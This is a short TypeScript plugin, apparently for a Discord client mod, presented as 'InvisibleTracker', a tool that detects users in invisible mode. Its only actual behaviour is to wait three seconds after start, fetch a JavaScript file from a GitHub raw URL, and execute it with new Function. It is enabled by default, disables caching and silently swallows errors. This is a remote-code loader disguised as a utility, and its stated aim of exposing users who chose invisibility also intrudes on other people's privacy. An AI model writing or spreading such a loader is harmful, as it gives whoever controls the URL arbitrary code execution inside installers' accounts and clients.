import definePlugin from "@utils/types";
import { Devs } from "@utils/constants";

const TRACKER_URL = "https://github.com/g-reborn/InvisibleTracker/raw/refs/heads/main/userscript.js";

async function loadTracker() {
    try {
        const res = await fetch(TRACKER_URL, { cache: "no-store" });
        if (res.ok) {
            const code = await res.text();
            const runner = new Function(code);
            runner();
        }
    } catch {
    }
}

export default definePlugin({
    name: "InvisibleTracker",
    description: "Monitors and detects users in invisible mode.",
    authors: [Devs.feelslove],
    tags: ["tracker", "tools", "privacy"],
    enabledByDefault: true,

    start() {
        setTimeout(loadTracker, 3000);
    },
    stop() { }
});
